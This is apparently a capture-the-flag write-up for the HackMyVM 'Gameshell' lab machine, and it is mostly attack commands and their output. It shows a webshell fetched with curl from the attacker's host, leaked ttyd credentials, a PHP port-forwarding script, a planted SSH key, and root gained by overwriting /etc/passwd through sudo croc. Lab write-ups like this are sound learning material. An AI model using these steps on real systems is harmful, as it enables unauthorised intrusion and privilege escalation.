# Gameshell

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.170:22
Open 10.0.2.170:80
Open 10.0.2.170:7681
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.170
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp   open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Bash // The Eternal Shell
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
7681/tcp open  http    syn-ack ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: ttyd - Terminal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/gameshell/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.170 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET      189l      700w     6849c http://10.0.2.170/
200      GET      189l      700w     6849c http://10.0.2.170/index.html
```

## HTTP (7681)

![writeup-1.png](/assets/pentest/hackmyvm/gameshell/writeup-1.png)

CTF Notes said to complete challenges so I guess we doing that
```bash
[mission 1] $ cd Castle/Main_tower/First_floor/Second_floor/Top_of_the_tower
/opt/gameshell/gameshell/World/Castle/Main_tower/First_floor/Second_floor/Top_of_the_tower
[mission 1] $ gsh check
Congratulations, mission 1 has been successfully completed!
```

or not because `/var/www/html` is writable, upload webshell and escape `gsh` thingy
```bash
[mission 2] $ curl 10.0.2.149/shell.php -o /var/www/html/shell.php
```

## Lateral Movement (eviden)

Odd port is running locally, checking process reveals it's running as `eviden` user and also shows credentials
```bash
www-data@GameShell:/opt/gameshell# ss -tunlp4
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*
tcp     LISTEN   0        128            127.0.0.1:9876          0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:7681          0.0.0.0:*       users:(("ttyd",pid=400,fd=12))

www-data@GameShell:/opt/gameshell# ps aux | grep 9876
eviden       416  0.0  0.0   1564  1016 ?        Ss   04:52   0:00 /usr/local/bin/ttyd -i 127.0.0.1 -p 9876 -c admin:nimda -W bash
www-data    5487  0.0  0.0   2472   572 ?        S    05:07   0:00 sh -c ps aux | grep 9876 2>&1
www-data    5489  0.0  0.0   3176   636 ?        S    05:07   0:00 grep 9876
```

Expose the port to outside
```php
<?php
$listen = 8888;
$targetHost = "127.0.0.1";
$targetPort = 9876;

$server = stream_socket_server("tcp://0.0.0.0:$listen", $errno, $errstr);
if (!$server) die("$errstr ($errno)\n");

while ($client = @stream_socket_accept($server)) {
    $target = stream_socket_client("tcp://$targetHost:$targetPort");

    stream_set_blocking($client, false);
    stream_set_blocking($target, false);

    while (!feof($client) && !feof($target)) {
        if ($data = fread($client, 8192)) fwrite($target, $data);
        if ($data = fread($target, 8192)) fwrite($client, $data);
        usleep(1000);
    }

    fclose($client);
    fclose($target);
}

## 1 Liner
# php -r '$l=8888;$th="127.0.0.1";$tp=9876;$s=stream_socket_server("tcp://0.0.0.0:$l");while($c=@stream_socket_accept($s)){ $t=stream_socket_client("tcp://$th:$tp"); stream_set_blocking($c,0);stream_set_blocking($t,0); while(!feof($c)&&!feof($t)){ if($d=fread($c,8192))fwrite($t,$d); if($d=fread($t,8192))fwrite($c,$d); usleep(1000);} fclose($c);fclose($t);}';
```

> **Note**: This is equivalent to `socat TCP-LISTEN:8888,fork TCP:127.0.0.1:9876`

```bash
└─$ gen_ssh_deploy
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIAs1QaeMDs4PyLJenpLSu/beuWz33WR1ffD4qn6iN57 woyag@kraken' >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
```

![writeup-2.png](/assets/pentest/hackmyvm/gameshell/writeup-2.png)

```bash
└─$ ssh -i id_rsa eviden@10.0.2.170
eviden@GameShell:~$ id
uid=1001(eviden) gid=1001(eviden) groups=1001(eviden)
```

## Privilege Escalation (root)

```bash
eviden@GameShell:~$ sudo -l
Matching Defaults entries for eviden on GameShell:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eviden may run the following commands on GameShell:
    (ALL) NOPASSWD: /usr/local/bin/croc
```

I was gonna transfer `.ssh`, but it's disallowed

![writeup-3.png](/assets/pentest/hackmyvm/gameshell/writeup-3.png)

```bash
└─$ echo "echo 'letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/bash' >> /etc/passwd"
echo 'letmein:$6$PU1gVoHzIRmnE/so$sY7Jc/OLo9paVtB9xnznRH7aYnm8wAuXAwKvdWIXSdbICXNBsCT4LL9LCIJf4X0GwgbXOhs3OgtuuEEvwPx3z1:0:0:letmein:/root:/bin/bash' >> /etc/passwd
---
eviden@GameShell:~$ cp /etc/passwd .
eviden@GameShell:~$ echo 'letmein:$6$PU1gVoHzIRmnE/so$sY7Jc/OLo9paVtB9xnznRH7aYnm8wAuXAwKvdWIXSdbICXNBsCT4LL9LCIJf4X0GwgbXOhs3OgtuuEEvwPx3z1:0:0:letmein:/root:/bin/bash' >> passwd

# Terminal 1
eviden@GameShell:~$ CROC_SECRET='Password123$' croc send passwd
# Terminal 2
eviden@GameShell:~$ sudo croc --out /etc --yes --overwrite
```

```bash
eviden@GameShell:~$ su letmein
Password:
root@GameShell:/home/eviden# id
uid=0(root) gid=0(root) groups=0(root)
```

### User.txt

```bash
root@GameShell:~# cat /home/silo/user.txt
flag{user-83add0ab24dcdb4f7a201772f1c10789}
```

### Root.txt

```bash
root@GameShell:/home/eviden# cat /root/root.txt
flag{root-fcf32fac298a31661e06e3d37148a21a}
```